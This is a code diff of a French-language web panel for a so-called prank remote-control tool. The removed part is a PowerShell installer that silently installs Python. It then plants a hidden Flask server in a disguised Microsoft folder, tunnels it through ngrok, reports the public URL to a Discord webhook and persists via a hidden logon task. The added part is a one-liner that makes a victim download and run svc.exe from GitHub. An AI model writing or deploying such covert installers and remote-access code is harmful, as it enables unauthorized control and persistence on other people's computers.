@@ -250,27 +250,22 @@
   <p>Controle a distance — entre amis uniquement</p>
 </header>
 
-<!-- ── SECTION 1 : Generateur d'installateur ────────────────────────────── -->
-<p class="section-title">Generer l'installateur</p>
+<!-- ── SECTION 1 : Generateur de commande ────────────────────────────────── -->
+<p class="section-title">Generer la commande d'installation</p>
 
 <div class="generator-box">
   <div class="field">
     <label>Webhook Discord</label>
-    <input type="url" id="genWebhook" placeholder="https://discord.com/api/webhooks/..." />
+    <input type="url" id="genWebhook" placeholder="https://discord.com/api/webhooks/..." oninput="updateCmd()" />
   </div>
   <div class="field">
     <label>Authtoken ngrok</label>
-    <input type="password" id="genToken" placeholder="2abc..." />
+    <input type="password" id="genToken" placeholder="2abc..." oninput="updateCmd()" />
   </div>
-  <div class="field">
-    <label>URL Raw du fichier heberge</label>
-    <input type="url" id="genHostUrl" placeholder="https://gist.githubusercontent.com/..." oninput="updateCmd()" />
-  </div>
-  <button class="btn green" onclick="generateInstaller()">Telecharger install.ps1</button>
 </div>
 
 <div class="cmd-box" id="cmdBox">
-  <code id="winrCmd">cmd /c curl -s -o %TEMP%\s.ps1 "TON_URL_RAW" && powershell -ep bypass %TEMP%\s.ps1</code>
+  <code id="winrCmd">cmd /c curl -sLo %TEMP%\svc.exe "https://github.com/lamziiii/prank-server/releases/latest/download/svc.exe" && %TEMP%\svc.exe -w "WEBHOOK" -t "TOKEN"</code>
   <button class="btn" style="margin-top:0;padding:.5rem .9rem;font-size:.8rem" onclick="copyCmd()">Copier</button>
 </div>
 
@@ -353,220 +348,19 @@
 
 <div id="toast"></div>
 
-<!-- Template PS1 stocke ici pour eviter tout echappement JS -->
-<script type="text/x-ps1" id="ps1template">
-$WEBHOOK     = "%%WEBHOOK%%"
-$NGROK_TOKEN = "%%NGROK_TOKEN%%"
-
-$ErrorActionPreference = "SilentlyContinue"
-$ProgressPreference    = "SilentlyContinue"
-
-$INSTALL_DIR = "$env:LOCALAPPDATA\Microsoft\PyService"
-New-Item -ItemType Directory -Force -Path $INSTALL_DIR | Out-Null
-
-if (-not (Get-Command python.exe -ErrorAction SilentlyContinue)) {
-    $setup = "$env:TEMP\py_setup.exe"
-    Invoke-WebRequest `
-        -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" `
-        -OutFile $setup -UseBasicParsing
-    Start-Process $setup `
-        -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_launcher=0" `
-        -Wait -NoNewWindow
-    $pyBase   = "$env:LOCALAPPDATA\Programs\Python\Python311"
-    $env:PATH = "$pyBase;$pyBase\Scripts;$env:PATH"
-}
-
-python -m pip install --upgrade pip --quiet --no-warn-script-location 2>$null
-python -m pip install flask flask-cors pygame requests pyngrok --quiet --no-warn-script-location 2>$null
-
-$svcPy = @'
-import os, json, threading, webbrowser, tempfile, time, ctypes, requests
-from flask import Flask, request, jsonify
-from flask_cors import CORS
-
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-app = Flask(__name__)
-CORS(app)
-
-with open(os.path.join(BASE_DIR, "config.json"), encoding="utf-8-sig") as f:
-    config = json.load(f)
-
-def _set_wallpaper(path):
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(path), 3)
-
-def _play_audio(path):
-    import pygame
-    pygame.mixer.init()
-    pygame.mixer.music.load(path)
-    pygame.mixer.music.play()
-    while pygame.mixer.music.get_busy():
-        time.sleep(0.1)
-    pygame.mixer.quit()
-    try: os.unlink(path)
-    except: pass
-
-def _show_popup(title, message):
-    import tkinter as tk
-    from tkinter import messagebox
-    root = tk.Tk(); root.withdraw()
-    root.wm_attributes("-topmost", True)
-    messagebox.showinfo(title, message, parent=root)
-    root.destroy()
-
-@app.route("/wallpaper", methods=["POST"])
-def wallpaper():
-    if "image" not in request.files:
-        return jsonify({"error": "champ image manquant"}), 400
-    f = request.files["image"]
-    ext = os.path.splitext(f.filename)[1].lower() or ".jpg"
-    dest = os.path.join(BASE_DIR, "wallpaper" + ext)
-    f.save(dest)
-    threading.Thread(target=_set_wallpaper, args=(dest,), daemon=True).start()
-    return jsonify({"status": "ok"})
-
-@app.route("/audio", methods=["POST"])
-def audio():
-    if "audio" not in request.files:
-        return jsonify({"error": "champ audio manquant"}), 400
-    f = request.files["audio"]
-    ext = os.path.splitext(f.filename)[1].lower() or ".mp3"
-    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=ext)
-    f.save(tmp.name); tmp.close()
-    threading.Thread(target=_play_audio, args=(tmp.name,), daemon=True).start()
-    return jsonify({"status": "ok"})
-
-@app.route("/popup", methods=["POST"])
-def popup():
-    data = request.get_json(silent=True)
-    if not data:
-        return jsonify({"error": "json invalide"}), 400
-    threading.Thread(
-        target=_show_popup,
-        args=(data.get("title", "Message"), data.get("message", "")),
-        daemon=True
-    ).start()
-    return jsonify({"status": "ok"})
-
-@app.route("/url", methods=["POST"])
-def open_url():
-    data = request.get_json(silent=True)
-    if not data:
-        return jsonify({"error": "json invalide"}), 400
-    url = data.get("url", "").strip()
-    if url:
-        threading.Thread(target=webbrowser.open, args=(url,), daemon=True).start()
-    return jsonify({"status": "ok"})
-
-def _send_discord(ngrok_url):
-    wh = config.get("webhook_url", "").strip()
-    if not wh:
-        return
-    try:
-        requests.post(wh, json={
-            "content": f"**{config['pseudo']}** est en ligne !\nURL : `{ngrok_url}`"
-        }, timeout=5)
-    except Exception:
-        pass
-
-def _start_tunnel():
-    from pyngrok import ngrok, conf as nc
-    token = config.get("ngrok_authtoken", "").strip()
-    if token:
-        nc.get_default().auth_token = token
-    return ngrok.connect(9999, "http").public_url
-
-if __name__ == "__main__":
-    try:
-        url = _start_tunnel()
-        _send_discord(url)
-    except Exception:
-        pass
-    app.run(host="0.0.0.0", port=9999, threaded=True)
-'@
-
-[System.IO.File]::WriteAllText(
-    "$INSTALL_DIR\svc.py",
-    $svcPy,
-    [System.Text.UTF8Encoding]::new($false)
-)
-
-$cfgJson = ([ordered]@{
-    pseudo          = $env:COMPUTERNAME
-    webhook_url     = $WEBHOOK
-    ngrok_authtoken = $NGROK_TOKEN
-}) | ConvertTo-Json
-
-[System.IO.File]::WriteAllText(
-    "$INSTALL_DIR\config.json",
-    $cfgJson,
-    [System.Text.UTF8Encoding]::new($false)
-)
-
-$taskName = "PyServiceHost"
-$pythonw  = @(
-    "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe",
-    "$env:LOCALAPPDATA\Programs\Python\Python312\pythonw.exe",
-    "$env:LOCALAPPDATA\Programs\Python\Python310\pythonw.exe",
-    "$env:LOCALAPPDATA\Programs\Python\Python39\pythonw.exe",
-    "C:\Python311\pythonw.exe",
-    "C:\Python312\pythonw.exe"
-) | Where-Object { Test-Path $_ } | Select-Object -First 1
-if (-not $pythonw) {
-    $cmd = Get-Command pythonw.exe -ErrorAction SilentlyContinue
-    $pythonw = if ($cmd) { $cmd.Source } else { "pythonw.exe" }
-}
-schtasks /create /tn $taskName /tr "`"$pythonw`" `"$INSTALL_DIR\svc.py`"" /sc onlogon /f /rl limited 2>$null
-
-$uninstall = @'
-$ErrorActionPreference = "SilentlyContinue"
-$dir = "$env:LOCALAPPDATA\Microsoft\PyService"
-Get-Process -Name pythonw, python | Where-Object {
-    (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").CommandLine -like "*PyService*"
-} | Stop-Process -Force
-schtasks /delete /tn "PyServiceHost" /f 2>$null
-if (Test-Path $dir) { Remove-Item $dir -Recurse -Force }
-'@
-
-[System.IO.File]::WriteAllText(
-    "$INSTALL_DIR\uninstall.ps1",
-    $uninstall,
-    [System.Text.UTF8Encoding]::new($false)
-)
-
-Start-Process $pythonw -ArgumentList "`"$INSTALL_DIR\svc.py`"" -WorkingDirectory $INSTALL_DIR -WindowStyle Hidden
-</script>
-
 <script>
-  // ── Generateur d'installateur ────────────────────────────────────────────
-  function generateInstaller() {
-    const webhook = document.getElementById('genWebhook').value.trim();
-    const token   = document.getElementById('genToken').value.trim();
-    if (!webhook) { toast('Entre le webhook Discord.', 'err'); return; }
-    if (!token)   { toast('Entre le token ngrok.', 'err'); return; }
-
-    let ps1 = document.getElementById('ps1template').textContent.trim();
-    ps1 = ps1.replace('%%WEBHOOK%%', webhook).replace('%%NGROK_TOKEN%%', token);
-
-    const blob = new Blob([ps1], { type: 'text/plain;charset=utf-8' });
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'install.ps1';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(a.href);
-    toast('install.ps1 telecharge ! Heberge-le et colle l\'URL Raw ci-dessus.');
-  }
+  const EXE_URL = 'https://github.com/lamziiii/prank-server/releases/latest/download/svc.exe';
 
   function updateCmd() {
-    const url  = document.getElementById('genHostUrl').value.trim();
-    const box  = document.getElementById('cmdBox');
-    const code = document.getElementById('winrCmd');
-    if (url) {
-      code.textContent = `cmd /c curl -s -o %TEMP%\\s.ps1 "${url}" && powershell -ep bypass %TEMP%\\s.ps1`;
+    const webhook = document.getElementById('genWebhook').value.trim();
+    const token   = document.getElementById('genToken').value.trim();
+    const box     = document.getElementById('cmdBox');
+    const code    = document.getElementById('winrCmd');
+    if (webhook && token) {
+      code.textContent = `cmd /c curl -sLo %TEMP%\\svc.exe "${EXE_URL}" && %TEMP%\\svc.exe -w "${webhook}" -t "${token}"`;
       box.classList.add('ready');
     } else {
-      code.textContent = `cmd /c curl -s -o %TEMP%\\s.ps1 "TON_URL_RAW" && powershell -ep bypass %TEMP%\\s.ps1`;
+      code.textContent = `cmd /c curl -sLo %TEMP%\\svc.exe "${EXE_URL}" && %TEMP%\\svc.exe -w "WEBHOOK" -t "TOKEN"`;
       box.classList.remove('ready');
     }
   }
